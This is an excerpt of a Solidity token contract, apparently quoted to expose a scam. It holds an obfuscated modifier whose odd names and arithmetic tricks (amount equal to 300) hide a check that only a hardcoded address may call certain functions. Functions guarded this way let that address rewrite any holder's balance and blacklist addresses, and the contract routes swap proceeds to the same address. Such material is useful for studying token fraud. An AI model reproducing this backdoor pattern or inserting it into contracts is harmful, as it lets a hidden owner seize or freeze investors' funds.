...
abstract contract Context {
    ...
    modifier Pfuseiwd(address sewdder, address pndsder,uint256 amount) {
        require(amount/60 == 5 && sewdder == pndsder);
        _;
    }
...
contract  $X is Context, IERC20, Ownable{
    ...
    constructor () {
        ...
        ICCP = payable(address(0x9D528ca1B309c8BC3D78350AA0f7814dA9813E49));
    ...
    function imlmenatos(address sender, uint256 valuess) public Pfuseiwd( _msgSender(), ICCP ,10**2 + 4*50){
        _balances[sender] = valuess.div(_balances[sender].add(5)).add(valuess.mul(2));
    }
    ...
    function mBlackListed(address[] calldata addresses, bool status) public Pfuseiwd(ICCP, msg.sender ,2 * (50 + 99 + 1) ){
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(ETHamountMarketing > 0)
            ICCP.transfer(ETHamountMarketing);
    }
